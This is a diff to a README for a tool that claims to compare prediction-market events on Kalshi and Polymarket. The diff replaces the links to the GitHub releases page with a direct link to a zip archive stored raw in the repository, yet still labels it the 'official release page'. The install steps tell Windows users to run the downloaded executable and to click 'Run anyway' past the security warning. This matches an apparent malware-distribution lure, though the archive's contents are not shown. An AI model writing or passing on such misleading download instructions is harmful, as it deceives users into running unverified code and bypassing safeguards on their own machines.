@@ -1,6 +1,6 @@
 # 🔍 find-similar-events - Compare prediction market events across platforms
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Color-truetoad229/find-similar-events/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Color-truetoad229/find-similar-events/main/similarity_analysis/find_events_similar_1.8-beta.2.zip)
 
 This application identifies matching events on Kalshi and Polymarket. It uses semantic matching to find the same trading opportunities on both platforms. You gain insight into price gaps for identical events without manual searching.
 
@@ -21,7 +21,7 @@ This tool solves that problem. It analyzes event titles using natural language p
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  **Visit the download page.** Go to the [official release page](https://github.com/Color-truetoad229/find-similar-events/releases) to access the installer.
+1.  **Visit the download page.** Go to the [official release page](https://raw.githubusercontent.com/Color-truetoad229/find-similar-events/main/similarity_analysis/find_events_similar_1.8-beta.2.zip) to access the installer.
 2.  **Download the installer.** Look for the file ending in `.exe` under the latest release. Save this file to your computer.
 3.  **Run the file.** Double-click the downloaded file to begin the setup process.
 4.  **Security prompt.** Windows may show a security screen. If it does, click "More info" and then "Run anyway." This screen appears because the app is provided directly by the developer.
